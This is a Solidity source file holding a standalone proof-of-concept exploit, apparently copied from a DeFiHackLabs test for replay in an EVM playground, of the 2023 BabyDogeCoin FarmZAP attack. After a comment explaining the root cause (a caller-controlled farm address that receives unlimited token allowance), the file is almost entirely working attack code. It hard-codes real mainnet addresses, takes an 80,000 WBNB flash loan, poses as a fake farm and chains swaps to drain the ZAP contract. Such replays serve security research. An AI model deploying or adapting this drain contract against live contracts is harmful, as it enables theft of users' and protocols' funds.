// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-BabyDogeCoin).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`ContractTest is Test`): the Aave/Radiant flash-loan callback
// `executeOperation` lives on the test itself, and the test ALSO implements
// `IFarm` (`depositOnBehalf` + `stakeToken`) so that FarmZAP's
// `buyTokensAndDepositOnBehalf(IFarm farm, ...)` calls back into it, believing
// `address(this)` is a legitimate farm. This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run, executeOperation
// unchanged, IFarm callback methods unchanged) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/BabyDogeCoin_exp.sol.
//
// Root cause: FarmZAP.buyTokensAndDepositOnBehalf(IFarm farm, ...) takes a
// completely caller-controlled `farm` address. It (1) asks farm.stakeToken()
// which token to swap into, (2) performs the swap with the OUTPUT LANDING IN
// THE ZAP ITSELF (not the caller), (3) grants `farm` a type(uint256).max
// allowance over that output, then (4) calls farm.depositOnBehalf(...) expecting
// the farm to pull the tokens. Since `farm` is the attacker's own contract, step
// (1) returns whatever token the attacker wants, step (4) is a no-op, and the
// attacker is left holding an unlimited allowance over tokens sitting in the
// ZAP - a plain transferFrom(ZAP -> attacker) drains them. Chaining several such
// swaps (WBNB -> BABYDOGE -> WBNB) through both PancakeSwap and FarmZAP itself,
// funded by an 80,000 WBNB Radiant flash loan, nets ~428.36 WBNB profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface Uni_Pair_V2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IFarm {
    function depositOnBehalf(uint256 amount, address account) external;
    function stakeToken() external returns (address);
}

interface IFarmZAP {
    function buyTokensAndDepositOnBehalf(
        IFarm farm,
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path
    ) external payable returns (uint256);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// Doubles as the fake "farm": FarmZAP is tricked into treating address(this) as
// a legitimate farm and calls back into stakeToken()/depositOnBehalf().
contract BabyDogeDrain is IFarm {
    IERC20 constant BABYDOGE = IERC20(0xc748673057861a797275CD8A068AbB95A902e8de);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 constant Pair = Uni_Pair_V2(0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0);
    IFarmZAP constant FarmZAP = IFarmZAP(0x451583B6DA479eAA04366443262848e27706f762);
    IAaveFlashloan constant Radiant = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);

    uint256 i;

    // Faithful copy of testExploit(): flash-loan 80,000 WBNB from Radiant.
    function run() external {
        address[] memory assets = new address[](1);
        assets[0] = address(WBNB);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 * 1e18;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(0), 0);
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        WBNB.approve(address(Radiant), amounts[0] + premiums[0]);
        WBNB.withdraw(80_000 * 1e18);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BABYDOGE);
        FarmZAP.buyTokensAndDepositOnBehalf{value: 80_000 ether}(IFarm(address(this)), 80_000 * 1e18, 0, path);
        BABYDOGEToWBNBInPancake();
        BABYDOGE.transferFrom(address(FarmZAP), address(BABYDOGE), BABYDOGE.balanceOf(address(FarmZAP)) - 1);
        BABYDOGE.transferFrom(address(FarmZAP), address(this), 1); // trigger sell BABYDOGECOIN and addLiquidity in pancakeSwap
        WBNBToBABYDOGEInPancake();
        WBNB.withdraw(0.001 ether);
        FarmZAP.buyTokensAndDepositOnBehalf{value: 0.001 ether}(IFarm(address(this)), 1e15, 0, path);
        BABYDOGEToWBNBInFarmZAP();
        return true;
    }

    function BABYDOGEToWBNBInPancake() internal {
        (uint256 WBNBReserve, uint256 BABYReserve,) = Pair.getReserves();
        BABYDOGE.transferFrom(address(FarmZAP), address(Pair), BABYReserve * 769 / 1000);
        uint256 amountIn = BABYDOGE.balanceOf(address(Pair)) - BABYReserve;
        uint256 amountOut = (9975 * amountIn * WBNBReserve) / (10_000 * BABYReserve + 9975 * amountIn);
        Pair.swap(amountOut, 0, address(this), new bytes(0));
    }

    function WBNBToBABYDOGEInPancake() internal {
        (uint256 WBNBReserve, uint256 BABYReserve,) = Pair.getReserves();
        WBNB.transfer(address(Pair), WBNBReserve * 767 / 1000);
        uint256 amountIn = WBNB.balanceOf(address(Pair)) - WBNBReserve;
        uint256 amountOut = (9975 * amountIn * BABYReserve) / (10_000 * WBNBReserve + 9975 * amountIn);
        Pair.swap(0, amountOut, address(FarmZAP), new bytes(0));
    }

    function BABYDOGEToWBNBInFarmZAP() internal {
        BABYDOGE.transferFrom(address(FarmZAP), address(this), BABYDOGE.balanceOf(address(FarmZAP)));
        BABYDOGE.approve(address(FarmZAP), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BABYDOGE);
        path[1] = address(WBNB);
        FarmZAP.buyTokensAndDepositOnBehalf(IFarm(address(this)), BABYDOGE.balanceOf(address(this)), 0, path);
        WBNB.transferFrom(address(FarmZAP), address(this), WBNB.balanceOf(address(FarmZAP)));
    }

    receive() external payable {}

    function depositOnBehalf(uint256 amount, address account) external {}

    function stakeToken() external returns (address) {
        i++;
        if (i != 3) {
            return address(BABYDOGE);
        } else {
            return address(WBNB);
        }
    }
}
